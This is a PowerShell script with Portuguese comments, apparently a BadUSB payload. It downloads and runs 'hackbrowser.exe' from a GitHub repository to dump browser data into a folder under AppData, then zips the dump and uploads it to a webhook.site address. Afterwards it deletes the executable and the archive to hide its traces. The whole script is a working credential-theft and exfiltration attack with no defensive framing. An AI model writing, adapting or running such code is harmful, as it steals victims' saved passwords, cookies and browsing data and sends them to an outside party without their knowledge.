# Caminho do arquivo a ser removido, usando variáveis de ambiente para torná-lo mais genérico
$zipPath = Join-Path -Path $env:APPDATA -ChildPath "dump+${env:USERNAME}.zip"

# Função para tentar remover o arquivo
function Remove-File {
    param($filePath)
    
    # Tentando remover o arquivo
    Try {
        Remove-Item -Path $filePath -Force -ErrorAction Stop
        Write-Host "Arquivo removido com sucesso: $filePath"
    } Catch {
        Write-Host "Erro ao remover o arquivo: $_"
        Start-Sleep -Seconds 2  # Espera de 2 segundos antes de tentar novamente
        Remove-Item -Path $filePath -Force -ErrorAction Stop  # Tentando novamente
    }
}

# Caminho de destino para o arquivo ZIP
$destinationPath = "$env:appdata\dump"

# Verificando se o diretório de destino existe e criando-o, se necessário
if (-not (Test-Path $destinationPath)) {
    New-Item -Path $destinationPath -ItemType Directory | Out-Null
}

# Definindo o diretório correto como local de trabalho
Set-Location $destinationPath

# Baixando e executando o arquivo hackbrowser.exe
Invoke-WebRequest -Uri "https://github.com/GamehunterKaan/BadUSB-Browser/raw/main/hackbrowser.exe" -OutFile "hb.exe"
Start-Process -FilePath "hb.exe"

# Aguardando um momento para a execução do arquivo
Start-Sleep -Seconds 5

# Removendo o arquivo hb.exe
Remove-Item -Path "hb.exe" -Force

# Caminho de origem para o arquivo compactado
$sourcePath = Get-Location
$zipFileName = "dump+" + $env:USERNAME + ".zip"
$zipPath = Join-Path -Path $env:appdata -ChildPath $zipFileName

# Criando o arquivo compactado ZIP
Compress-Archive -Path $sourcePath -DestinationPath $zipPath -Force

# Enviando para o Webhook
$WebhookUrl = "https://webhook.site/8e9eb21c-ee6a-4888-b509-c5e379b69a90"
$body = @{
    "username" = "PowerShell Bot"
    "content"  = "Arquivo compactado: $zipFileName"
}

# Convertendo os dados para JSON
$jsonBody = $body | ConvertTo-Json

# Anexando o arquivo ZIP à solicitação
$attachment = Get-Item -Path $zipPath

# Criando o conteúdo multipart/form-data
$boundary = "----WebKitFormBoundary" + [System.Guid]::NewGuid().ToString()
$LF = "`r`n"
$headers = @{
    "Content-Type" = "multipart/form-data; boundary=$boundary"
}

# Montando o corpo multipart
$bodyContent = "--$boundary$LF"
$bodyContent += "Content-Disposition: form-data; name=`"file`"; filename=`"$($attachment.Name)`"$LF"
$bodyContent += "Content-Type: application/octet-stream$LF$LF"
$bodyContent += [System.IO.File]::ReadAllText($attachment.FullName) + $LF
$bodyContent += "--$boundary--$LF"

# Enviando a solicitação POST com o arquivo e dados JSON para o Webhook
Invoke-RestMethod -Uri $WebhookUrl -Method Post -Headers $headers -Body $bodyContent

# Tentando remover o arquivo ZIP
Remove-File -filePath $zipPath
